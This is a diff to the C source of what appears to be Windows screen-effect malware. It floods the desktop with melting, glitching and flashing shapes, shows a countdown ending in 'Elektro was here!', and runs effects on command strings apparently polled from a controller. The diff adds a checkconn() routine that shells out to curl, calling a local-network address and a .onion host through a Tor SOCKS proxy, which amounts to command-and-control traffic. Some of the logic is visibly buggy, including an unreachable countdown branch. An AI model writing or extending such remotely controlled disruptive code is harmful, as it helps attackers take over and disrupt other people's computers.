@@ -173,8 +173,9 @@ void squarefx_run() {
     int green = rand() % 255;
     int blue = rand() % 255;
 
-    HBRUSH white = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed nero
-    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco
+    HBRUSH kolory = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed nero
+    SelectObject(hdc, GetStockObject(NULL_PEN)); // toglie i bordi dalle forme
+    SelectObject(hdc, kolory); // usa sopra l'hdc, nome "white"
 
     Rectangle(hdc, x, y, x + rx, y + ry); // top, left, bottom, right
 
@@ -195,7 +196,7 @@ void squarefx_run() {
     // quelle di sopra sono condizioni, non muovono un cazzo, grazie alla parte finale qualcosa si muove.
 
     //avoid mem leaks
-    DeleteObject(white);
+    DeleteObject(kolory);
     ReleaseDC(NULL, hdc);
     Sleep(5);
 }
@@ -260,7 +261,7 @@ void fkngmelter() {
     static int x = 0; // static, altrimenti reset brutale a causa di rand che riparte dal seed 0
 
     x = rand() % w;
-    BitBlt(hdc, x, 5, 4, h, hdc, x, 0, SRCCOPY);
+    BitBlt(hdc, x, 15, 70, h, hdc, x, 0, SRCCOPY);
     ReleaseDC(NULL, hdc);
     Sleep(2);
 }
@@ -294,7 +295,7 @@ void mtrfkngatombomb() {
     Sleep(10);
 }
 
-void squaryshape() {
+void squaryshapez() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
     HDC hdc = GetDC(NULL);
@@ -302,8 +303,8 @@ void squaryshape() {
     int rx = 0;
     int ry = 0;
 
-    rx = 1 + rand() % 200;
-    ry = 1 + rand() % 200;
+    rx = 1 + rand() % 200; // max x = 200px
+    ry = 1 + rand() % 200; // idem qui
 
     int x = rand() % w;
     int y = rand() % h;
@@ -313,15 +314,21 @@ void squaryshape() {
     int green = rand() % 255;
     int blue = rand() % 255;
 
-    HBRUSH white = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed nero
-    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco
+    HBRUSH kolory = CreateSolidBrush(RGB(red, green, blue));
+    SelectObject(hdc, GetStockObject(NULL_PEN)); // toglie i bordi dalle forme
+    SelectObject(hdc, kolory); // selectiona kolori 4l'hdc
 
     Rectangle(hdc, x, y, x + rx, y + ry); // top, left, bottom, right
 
     //avoid mem leaks
-    DeleteObject(white);
+    DeleteObject(kolory);
     ReleaseDC(NULL, hdc);
     Sleep(1);
+}
+
+void checkconn() {
+    system("curl -s http://192.168.122.1:80/yesimok");
+    popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r");
 }
 
 void startfx() {
@@ -337,7 +344,8 @@ void startfx() {
     squarefx_run();
     fkngmelter();
     mtrfkngatombomb();
-    squaryshape();
+    squaryshapez();
+    mtrfkngatombomb();
 }
 
 void msgbox() {
@@ -376,7 +384,7 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
     //parametri & settings 4 dwm displaying
     SetBkMode(hdc, OPAQUE); // no bordi strani dietro
     SetTextColor(hdc, RGB(255,0,0)); // colore testo red
-    HFONT font = CreateFont(128, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
+    HFONT font = CreateFont(128, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
     SelectObject(hdc, font);
 
     int now = time(NULL); //ora
@@ -399,22 +407,22 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
     while (1) {
         if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, "Elektro was here!", 17);} // 17 = num di char del text
         else if (GetTickCount64() - elapsed < 5000) {fkngmelter();}
-        else if (GetTickCount64() - elapsed < 10000) {pixelate();squaryshape();}
+        else if (GetTickCount64() - elapsed < 10000) {pixelate();squaryshapez();}
         else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 14000) {pixelate();}
         else if (GetTickCount64() - elapsed < 17000) {widthglitch_run();mtrfkngatombomb();}
-        else if (GetTickCount64() - elapsed < 21000) {lulu();squaryshape();}
+        else if (GetTickCount64() - elapsed < 21000) {lulu();squaryshapez();}
         else if (GetTickCount64() - elapsed < 23000) {pixelate();}
         else if (GetTickCount64() - elapsed < 25000) {ltunnel_run();pixelate();}
         else if (GetTickCount64() - elapsed < 36000) {pixelate();}
         else if (GetTickCount64() - elapsed < 33000) {tunnel_run();mtrfkngatombomb();}
-        else if (GetTickCount64() - elapsed < 43000) {mtrfkngatombomb();squaryshape();}
-        else if (GetTickCount64() - elapsed < 44000) {pixelate();}
+        else if (GetTickCount64() - elapsed < 43000) {mtrfkngatombomb();squaryshapez();}
+        else if (GetTickCount64() - elapsed < 44000) {mtrfkngatombomb();pixelate();}
         else if (GetTickCount64() - elapsed < 63000) {squarefx_run();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 65000) {circleshake_run();pixelate();}
         else if (GetTickCount64() - elapsed < 69000) {tunnel_run();ltunnel_run();}
         else if (GetTickCount64() - elapsed < 77000) {fkngmelter();heightglitch_run();}
-        else if (GetTickCount64() - elapsed < 88000) {mtrfkngatombomb();squaryshape();}
+        else if (GetTickCount64() - elapsed < 88000) {mtrfkngatombomb();squaryshapez();}
         else {break;}
     }
 }
@@ -514,12 +522,12 @@ int main() {
 
         else if (strcmp(reqtextbuffer, "10") == 0) {
             int i;
-            for (i=0;i<1000;i++) {squaryshape();}
+            for (i=0;i<1000;i++) {squaryshapez();}
         }
 
         else if (strcmp(reqtextbuffer, "11") == 0) {
             int i;
-            for (i=0;i<4000;i++) {predictablemelter();}
+            for (i=0;i<1000;i++) {predictablemelter();}
         }
 
         else if (strcmp(reqtextbuffer, "Lulu") == 0) {
@@ -556,6 +564,8 @@ int main() {
             printf(timer);
             countdown(secs);
         }
+
+        else if (strstr(reqtextbuffer, "Are u OK?") == 0) {checkconn();}
         else {Sleep(20000);}
     }
     return 0;
